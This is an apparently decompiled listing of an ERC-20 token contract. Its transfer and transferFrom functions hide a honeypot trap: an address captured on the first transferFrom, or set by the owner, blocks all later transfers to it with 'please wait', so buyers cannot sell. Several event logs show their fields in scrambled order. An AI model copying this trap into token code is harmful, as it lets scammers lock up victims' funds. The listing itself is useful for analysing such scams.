def storage:
  owner is addr at storage 0
  newOwner is addr at storage 1
  symbol is array of uint256 at storage 2
  name is array of uint256 at storage 3
  decimals is uint8 at storage 4
  stor5 is uint256 at storage 5
  unknown1ee59f20Address is addr at storage 6
  balanceOf is mapping of uint256 at storage 7
  allowance is mapping of uint256 at storage 8

def name(): 
  return name[0 len name.length]

def unknown1ee59f20(): 
  return unknown1ee59f20Address

def decimals(): 
  return decimals

def balanceOf(address _owner): 
  require calldata.size - 4 >= 32
  return balanceOf[addr(_owner)]

def owner(): 
  return owner

def symbol(): # not payable
  return symbol[0 len symbol.length]

def newOwner(): # not payable
  return newOwner

def allowance(address _owner, address _spender): # not payable
  require calldata.size - 4 >= 64
  return allowance[addr(_owner)][addr(_spender)]

#
#  Regular functions
#

def _fallback() payable: # default function
  revert

def totalSupply(): # not payable
  require balanceOf[0] <= stor5
  return (stor5 - balanceOf[0])

def transferOwnership(address _newOwner): # not payable
  require calldata.size - 4 >= 32
  require caller == owner
  newOwner = _newOwner

def unknown81f4f399(addr _param1): # not payable
  require calldata.size - 4 >= 32
  require caller == owner
  unknown1ee59f20Address = _param1

def acceptOwnership(): # not payable
  require caller == newOwner
  log OwnershipTransferred(
        address previousOwner=owner,
        address newOwner=newOwner)
  owner = newOwner
  newOwner = 0

def approve(address _spender, uint256 _value): # not payable
  require calldata.size - 4 >= 64
  allowance[caller][addr(_spender)] = _value
  log Approval(
        address owner=_value,
        address spender=caller,
        uint256 value=_spender)
  return 1

def transfer(address _to, uint256 _value): # not payable
  require calldata.size - 4 >= 64
  if _to == unknown1ee59f20Address:
      revert with 0, 'please wait'
  require _value <= balanceOf[caller]
  balanceOf[caller] -= _value
  require balanceOf[addr(_to)] + _value >= balanceOf[addr(_to)]
  balanceOf[addr(_to)] += _value
  log Transfer(
        address from=_value,
        address to=caller,
        uint256 value=_to)
  return 1

def approveAndCall(address _spender, uint256 _amount, bytes _extraData): # not payable
  require calldata.size - 4 >= 96
  require _extraData <= 4294967296
  require _extraData + 36 <= calldata.size
  require _extraData.length <= 4294967296 and _extraData + _extraData.length + 36 <= calldata.size
  allowance[caller][addr(_spender)] = _amount
  mem[ceil32(_extraData.length) + 128] = _amount
  log Approval(address owner, address spender, uint256 value):
               Mask(8 * -ceil32(_extraData.length) + _extraData.length + 32, 0, 0),
               mem[_extraData.length + 160 len -_extraData.length + ceil32(_extraData.length)],
               caller,
               _spender,
  require ext_code.size(_spender)
  call _spender with:
       gas gas_remaining wei
      args caller, _amount, addr(this.address), Array(len=_extraData.length, data=_extraData[all])
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  return 0, 1

def transferFrom(address _from, address _to, uint256 _value): # not payable
  require calldata.size - 4 >= 96
  if not _from:
      if _to == unknown1ee59f20Address:
          revert with 0, 'please wait'
  else:
      if unknown1ee59f20Address:
          if _to == unknown1ee59f20Address:
              revert with 0, 'please wait'
      else:
          unknown1ee59f20Address = _to
  require _value <= balanceOf[addr(_from)]
  balanceOf[addr(_from)] -= _value
  require _value <= allowance[addr(_from)][caller]
  allowance[addr(_from)][caller] -= _value
  require balanceOf[addr(_to)] + _value >= balanceOf[addr(_to)]
  balanceOf[addr(_to)] += _value
  log Transfer(
        address from=_value,
        address to=_from,
        uint256 value=_to)
  return 1
